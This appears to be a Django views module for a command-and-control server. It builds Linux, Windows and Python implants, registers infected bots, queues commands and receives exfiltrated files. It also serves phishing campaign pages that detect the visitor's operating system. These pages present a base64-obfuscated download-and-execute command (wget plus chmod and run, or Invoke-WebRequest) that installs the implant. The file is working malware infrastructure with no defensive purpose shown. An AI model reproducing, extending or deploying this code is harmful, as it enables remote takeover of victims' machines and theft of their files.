from rest_framework.decorators import api_view
from rest_framework.response import Response
from .models import Bot, Task, TaskCommands, Campain, CampainTemplates
from .serializers import BotSerializer, TaskSerializer
from livingoffland.livingoffland_ops import obfuscate_command_base64
from django.http import FileResponse
from django.utils import timezone
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
import os
from datetime import datetime
import subprocess
import uuid

def create_client_linux(serverip, serverport, clientuuid, campaignuuid):
    os.makedirs(f"./c2/clients/base/", exist_ok=True)
    os.makedirs(f"./c2/clients/sources/", exist_ok=True)
    os.makedirs(f"./c2/clients/clients/", exist_ok=True)
    with open("./c2/clients/base/basic_linux.c", "r", encoding="utf-8") as f:
        basetext = f.read()
    text = basetext.replace("SERVERIP", serverip).replace('SERVERPORT', serverport).replace('CLIENTUUID', clientuuid).replace('CAMPAIGNUUIDSTRING', campaignuuid)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{clientuuid}_{timestamp}"
    with open(f"./c2/clients/sources/{filename}.c", "w", encoding="utf-8") as f:
        f.write(text)

    result = subprocess.run(
        ["gcc", "-o", f"./c2/clients/clients/{filename}", f"./c2/clients/sources/{filename}.c"],
        capture_output=True,
        text=True
    )
    return filename

def create_client_windows(serverip, serverport, clientuuid, campaignuuid):
    os.makedirs(f"./c2/clients/base/", exist_ok=True)
    os.makedirs(f"./c2/clients/sources/", exist_ok=True)
    os.makedirs(f"./c2/clients/clients/", exist_ok=True)
    with open("./c2/clients/base/basic_windows.c", "r", encoding="utf-8") as f:
        basetext = f.read()
    text = basetext.replace("SERVERIP", serverip).replace('SERVERPORT', serverport).replace('CLIENTUUID', clientuuid).replace('CAMPAIGNUUIDSTRING', campaignuuid)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{clientuuid}_{timestamp}.exe"
    with open(f"./c2/clients/sources/{filename}.c", "w", encoding="utf-8") as f:
        f.write(text)

    result = subprocess.run(
        ["x86_64-w64-mingw32-gcc", f"./c2/clients/sources/{filename}.c", "-o", f"./c2/clients/clients/{filename}", "-lws2_32"],
        capture_output=True,
        text=True
    )
    return filename

def create_client_python(serverip, serverport, clientuuid, campaignuuid):
    os.makedirs(f"./c2/clients/base/", exist_ok=True)
    os.makedirs(f"./c2/clients/sources/", exist_ok=True)
    os.makedirs(f"./c2/clients/clients/", exist_ok=True)
    with open("./c2/clients/base/basic.py", "r", encoding="utf-8") as f:
        basetext = f.read()
    text = basetext.replace("SERVERIP", serverip).replace('SERVERPORT', serverport).replace('CLIENTUUID', clientuuid).replace('CAMPAIGNUUIDSTRING', campaignuuid)
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{clientuuid}_{timestamp}.py"
    with open(f"./c2/clients/sources/{filename}", "w", encoding="utf-8") as f:
        f.write(text)
    with open(f"./c2/clients/clients/{filename}", "w", encoding="utf-8") as f:
        f.write(text)

    return filename

@api_view(['POST'])
def register_bot(request):
    uuid = request.data.get('uuid')
    campaignuuid = request.data.get('campaignuuid')
    ip = request.META.get('REMOTE_ADDR')
    system_info = request.data.get('system_info')
    client_type = request.data.get('client_type')
    print(campaignuuid)
    if campaignuuid:
        campaign = Campain.objects.get(uuid=campaignuuid)
    else:
        campaign = None
    if not campaign:
        campaign = None
    bot, created = Bot.objects.get_or_create(uuid=uuid, defaults={'ip_address': ip, 'system_info': system_info, 'client_type':client_type, 'campain':campaign})
    if not created:
        bot.last_seen = timezone.now()
        bot.save()
    return Response({'status': 'ok'})

@api_view(['POST'])
def get_task(request):
    uuid = request.data.get('uuid')
    bot = Bot.objects.filter(uuid=uuid).first()
    if bot:
        bot.last_seen = timezone.now()
        bot.save()
        task = Task.objects.filter(bot=bot, status='pending').first()
        if task:
            if task.requested_at == None:
                task.requested_at = timezone.now()
                task.save()
            return Response({'task_id': task.id, 'command': task.command, 'args': task.args})
    return Response({'task': None})

@api_view(['POST'])
def post_result(request):
    task_id = int(request.data.get('task_id'))
    output = request.data.get('output')
    task = Task.objects.filter(id=task_id).first()
    if task:
        task.result = output
        task.status = 'done'
        task.completed_at = timezone.now()
        task.save()
    return Response({'status': 'ok'})

@api_view(['POST'])
def exfil_file(request):
    bot_id = request.POST.get('uuid')
    task_id = request.POST.get('task_id')
    uploaded_file = request.FILES['file']
    os.makedirs(f"./c2/data/{bot_id}", exist_ok=True)
    path = f"./c2/data/{bot_id}/{task_id}_{uploaded_file.name}"
    with open(path, 'wb') as f:
        for chunk in uploaded_file.chunks():
            f.write(chunk)
    task = Task.objects.filter(id=task_id).first()
    if task:
        task.result = f"Filepath: {path}"
        task.status = 'done'
        task.completed_at = timezone.now()
        task.save()
    return Response({'status': 'ok'})


# --- Web UI Views ---
@login_required
def c2dashboard(request):
    bots = Bot.objects.all().order_by('-last_seen')
    return render(request, 'c2dashboard.html', {'bots': bots})

@login_required
def c2bot_detail(request, bot_id):
    bot = Bot.objects.get(id=bot_id)
    tasks = Task.objects.filter(bot=bot).order_by('-created_at')
    taskcommands = TaskCommands.objects.all()
    if request.method == 'POST':
        command = request.POST.get('command')
        args = request.POST.get('args')
        if command:
            Task.objects.create(bot=bot, command=command, args=args)
            return redirect('c2bot_detail', bot_id=bot.id)
    return render(request, 'c2bot_detail.html', {'bot': bot, 'tasks': tasks, 'taskcommands':taskcommands})

@login_required
def c2payloads(request):
    if request.method == 'POST':
        category = request.POST.get('category')
        clientuuid = request.POST.get('clientuuid')
        serverip = request.POST.get('serverip')
        serverport = request.POST.get('serverport')
        print(serverip)
        if category == 'linuxc':
            filename = create_client_linux(serverip=serverip, serverport=serverport, clientuuid=clientuuid, campaignuuid='')
            return render(request, 'c2payloads.html', {'fileid':f"{filename}"})
        elif category == 'windowsc':
            filename = create_client_windows(serverip=serverip, serverport=serverport, clientuuid=clientuuid, campaignuuid='')
            return render(request, 'c2payloads.html', {'fileid':f"{filename}"})
        elif category == 'python':
            filename = create_client_python(serverip=serverip, serverport=serverport, clientuuid=clientuuid, campaignuuid='')
            return render(request, 'c2payloads.html', {'fileid':f"{filename}"})
        else:
            return render(request, 'c2payloads.html')
    return render(request, 'c2payloads.html')

@login_required
def c2payloads_download(request, fileid):
    file_path = f"./c2/clients/clients/{fileid}"
    return FileResponse(open(file_path, "rb"), as_attachment=True, filename=f"{fileid}")

@login_required
def c2taskdelete(request, task_id):
    if request.method == 'POST':
        task = Task.objects.get(pk=task_id)
        if task.command == "exfil":
            file = (task.result).replace('Filepath: ', '')
            os.remove(file)
        else:
            task.delete()
        return redirect(request.META.get("HTTP_REFERER", "/"))
    
@login_required
def c2taskdownload(request, bot_id, task_id):
    if request.method == 'POST':
        task = Task.objects.get(pk=task_id)
        if task.command == "exfil":
            filepath = (task.result).replace('Filepath: ', '')
            filename = os.path.basename(filepath)
            return FileResponse(open(filepath, "rb"), as_attachment=True, filename=f"{filename}")
    return redirect(request.META.get("HTTP_REFERER", "/"))

@login_required
def c2campaign(request):
    campaign = Campain.objects.all()
    return render(request, 'c2campaign.html', {'campaign':campaign})

@login_required
def c2campaigncreator(request):
    campaigntemplates = CampainTemplates.objects.all()
    if request.method == 'POST':
        templatename = request.POST.get('category')
        campaignname = request.POST.get('campaignname')
        campaigntemplate = campaigntemplates.filter(name=templatename)
        campaign = Campain.objects.create(uuid=uuid.uuid4(), name=campaignname, site_template=campaigntemplate[0])
        
        return render(request, 'c2campaigncreator.html', {'campaigntemplates': campaigntemplates})
    else: 
        return render(request, 'c2campaigncreator.html', {'campaigntemplates': campaigntemplates})
    
@login_required
def c2campaigninfo(request, uuid):
    campaign = Campain.objects.filter(uuid=uuid)
    bots = Bot.objects.filter(campain__uuid=uuid).order_by('-last_seen')
    return render(request, 'c2campaigninfo.html', {'campaign':campaign[0], 'bots':bots})


def c2campaignpage(request, campaignuuid):
    new_uuid = uuid.uuid4()
    return redirect('c2campaignpageunique', campaignuuid, new_uuid)


def c2campaignpageunique(request, campaignuuid, clientuuid):
    campaign = Campain.objects.get(uuid=campaignuuid)
    print(campaign.serverip)
    ua = request.META.get('HTTP_USER_AGENT', '').lower()
    
    if 'windows' in ua:
        os_name = 'Windows'
        filename = create_client_windows(serverip=campaign.serverip, serverport=str(campaign.serverport), clientuuid=clientuuid, campaignuuid=campaignuuid)
        basecommand = f"Invoke-WebRequest -Uri 'http://{campaign.serverip}:{campaign.serverport}/command/file/{campaign.uuid}/{filename}' -OutFile test.exe"
        command = obfuscate_command_base64(basecommand, "windows")
    elif 'mac os' in ua or 'macintosh' in ua:
        os_name = 'macOS'
    elif 'linux' in ua:
        os_name = 'Linux'
        filename = create_client_linux(serverip=campaign.serverip, serverport=str(campaign.serverport), clientuuid=clientuuid, campaignuuid=campaignuuid)
        basecommand = f"wget http://{campaign.serverip}:{campaign.serverport}/command/file/{campaign.uuid}/{filename} -O myfile && sudo chmod +x myfile && ./myfile"
        command = obfuscate_command_base64(basecommand, "linux")
    elif 'android' in ua:
        os_name = 'Android'
    elif 'iphone' in ua or 'ipad' in ua:
        os_name = 'iOS'
    else:
        os_name = 'Unknown OS'
    print(os_name)
    return render(request, 'c2campaintemplates/auto_copy_command.html', {'command':command})

def c2payloads_download_fromcampain(request, campaignuuid, fileid):
    file_path = f"./c2/clients/clients/{fileid}"
    return FileResponse(open(file_path, "rb"), as_attachment=True, filename=f"{fileid}")
